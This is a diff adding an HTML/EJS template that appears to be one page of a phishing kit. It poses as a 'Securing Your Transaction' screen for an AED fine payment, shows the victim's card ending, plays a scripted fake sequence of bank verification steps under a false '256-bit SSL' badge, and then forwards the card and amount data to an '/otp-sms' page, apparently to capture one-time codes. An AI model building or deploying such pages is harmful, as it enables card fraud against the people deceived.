@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Securing Transaction...</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body { font-family:'Segoe UI',Arial,sans-serif; max-width:480px; margin:0 auto; }
+@keyframes spin  { to { transform: rotate(360deg); } }
+@keyframes pulse { 0%,100% { box-shadow:0 0 40px rgba(0,130,255,0.5); transform:scale(1); } 50% { box-shadow:0 0 60px rgba(0,130,255,0.8); transform:scale(1.05); } }
+@keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+</style>
+</head>
+<body>
+
+<div style="min-height:100vh;background:linear-gradient(160deg,#0f2027,#203a43,#2c5364);display:flex;align-items:center;justify-content:center;padding:24px;">
+  <div style="background:rgba(255,255,255,0.04);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.12);border-radius:24px;padding:48px 32px;width:100%;max-width:380px;text-align:center;">
+
+    <!-- Shield -->
+    <div style="position:relative;display:inline-block;margin-bottom:32px;">
+      <div id="shield" style="width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#00c6ff,#0072ff);display:flex;align-items:center;justify-content:center;margin:0 auto;box-shadow:0 0 40px rgba(0,130,255,0.5);animation:pulse 2s ease-in-out infinite;">
+        <svg width="38" height="38" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2L4 5v6c0 5.5 3.8 10.7 8 12 4.2-1.3 8-6.5 8-12V5l-8-3z" fill="white" opacity="0.9"/>
+          <path d="M9 12l2 2 4-4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+    </div>
+
+    <div style="font-size:20px;font-weight:700;color:white;margin-bottom:8px;">Securing Your Transaction</div>
+    <div style="font-size:13px;color:rgba(255,255,255,0.55);margin-bottom:36px;">
+      Card ending in <strong style="color:rgba(255,255,255,0.8);">****<%= cardLast4 %></strong>
+      &nbsp;·&nbsp;AED <%= totalFine.toLocaleString() %>
+    </div>
+
+    <!-- Progress bar -->
+    <div style="background:rgba(255,255,255,0.1);border-radius:100px;height:6px;margin-bottom:28px;overflow:hidden;">
+      <div id="progress-bar" style="height:100%;width:0%;background:linear-gradient(90deg,#00c6ff,#0072ff);border-radius:100px;transition:width 0.7s ease;"></div>
+    </div>
+
+    <!-- Steps -->
+    <div id="steps" style="text-align:left;display:flex;flex-direction:column;gap:14px;"></div>
+
+    <div style="margin-top:36px;font-size:11px;color:rgba(255,255,255,0.3);display:flex;align-items:center;justify-content:center;gap:6px;">
+      <span>🔒</span><span>Secured by 256-bit SSL encryption</span>
+    </div>
+  </div>
+</div>
+
+<script>
+const STEPS = ['Verifying card details...','Contacting your bank...','Sending push notification...','Ready!'];
+const AMOUNT     = <%- JSON.stringify(amount) %>;
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+
+let currentStep = 0;
+
+function renderSteps() {
+  const container = document.getElementById('steps');
+  container.innerHTML = STEPS.map((label, i) => {
+    const done   = currentStep > i;
+    const active = currentStep === i;
+    const bgDot  = done ? 'linear-gradient(135deg,#00c6ff,#0072ff)' : active ? 'rgba(0,130,255,0.25)' : 'rgba(255,255,255,0.08)';
+    const border = active ? '2px solid rgba(0,130,255,0.6)' : '2px solid transparent';
+    const inner  = done
+      ? `<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`
+      : active
+      ? `<div style="width:8px;height:8px;border-radius:50%;background:#0072ff;animation:blink 1s ease infinite;"></div>`
+      : `<div style="width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,0.2);"></div>`;
+    const color  = done ? 'rgba(255,255,255,0.9)' : active ? 'white' : 'rgba(255,255,255,0.35)';
+    const fw     = (done || active) ? '600' : '400';
+    return `<div style="display:flex;align-items:center;gap:12px;">
+      <div style="width:24px;height:24px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:${bgDot};border:${border};transition:all 0.4s ease;">${inner}</div>
+      <span style="font-size:13px;color:${color};font-weight:${fw};transition:all 0.4s ease;">${label}</span>
+    </div>`;
+  }).join('');
+  document.getElementById('progress-bar').style.width = Math.min((currentStep / STEPS.length) * 100, 100) + '%';
+}
+
+renderSteps();
+
+STEPS.forEach((_, i) => {
+  setTimeout(() => { currentStep = i + 1; renderSteps(); }, (i + 1) * 900);
+});
+
+setTimeout(() => {
+  const sidParam = SID ? '&sid=' + SID : '';
+  window.location.replace('/otp-sms?amount=' + AMOUNT + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&totalFine=' + TOTAL_FINE + '&issuer=' + encodeURIComponent(ISSUER) + sidParam);
+}, STEPS.length * 900 + 600);
+</script>
+</body>
+</html>
